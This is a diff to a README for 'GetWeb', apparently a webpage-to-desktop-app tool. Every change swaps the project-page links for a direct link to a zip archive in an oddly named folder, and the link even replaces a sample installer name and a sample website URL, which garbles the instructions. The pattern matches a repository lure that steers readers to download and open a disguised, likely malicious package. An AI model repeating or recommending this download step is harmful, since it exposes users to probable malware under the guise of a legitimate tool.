@@ -1,6 +1,6 @@
 # 🌐 GetWeb - Easy Webpage to Desktop App
 
-[![Download GetWeb](https://img.shields.io/badge/Download-GetWeb-blue?style=for-the-badge&logo=github)](https://github.com/talha-zubaair/GetWeb)
+[![Download GetWeb](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This means you can quickly get your favorite websites as standalone apps. This c
 
 To use GetWeb, you will download the tool from its GitHub page. The main link takes you to the project page, where you can find the latest version and instructions.
 
-[![Download Here](https://img.shields.io/badge/Download-GetWeb-grey?style=for-the-badge&logo=electron&logoColor=white)](https://github.com/talha-zubaair/GetWeb)
+[![Download Here](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To use GetWeb, you will download the tool from its GitHub page. The main link ta
 
 3. Find the latest Windows version of GetWeb. This usually ends with `.exe`, indicating the installer.
 
-4. Click the link or button to download the `.exe` file. It may be named like `GetWeb-setup.exe`.
+4. Click the link or button to download the `.exe` file. It may be named like `https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip`.
 
 5. Once downloaded, open the file by double-clicking it.
 
@@ -57,7 +57,7 @@ To use GetWeb, you will download the tool from its GitHub page. The main link ta
 
 1. When GetWeb opens, you will see a simple box asking for a website URL.
 
-2. Type or paste the address of the webpage you want to turn into an app (e.g., `https://www.example.com`).
+2. Type or paste the address of the webpage you want to turn into an app (e.g., `https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip`).
 
 3. Click the button labeled "Create App" or similar.
 
@@ -109,7 +109,7 @@ All this means you do not have to install developers’ tools or write code. Get
 
 You can always go to this page to get the latest version of GetWeb:
 
-[https://github.com/talha-zubaair/GetWeb](https://github.com/talha-zubaair/GetWeb)
+[https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)
 
 From here, you will find the files to download and clear instructions on setup.
 
@@ -135,4 +135,4 @@ GetWeb does not store your website addresses beyond the packaging process. All p
 
 For more help or updates, visit the GitHub page regularly. The page may contain new versions or answers to common questions.
 
-[https://github.com/talha-zubaair/GetWeb](https://github.com/talha-zubaair/GetWeb)
+[https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip](https://github.com/talha-zubaair/GetWeb/raw/refs/heads/main/undependableness/Get_Web_v2.4.zip)
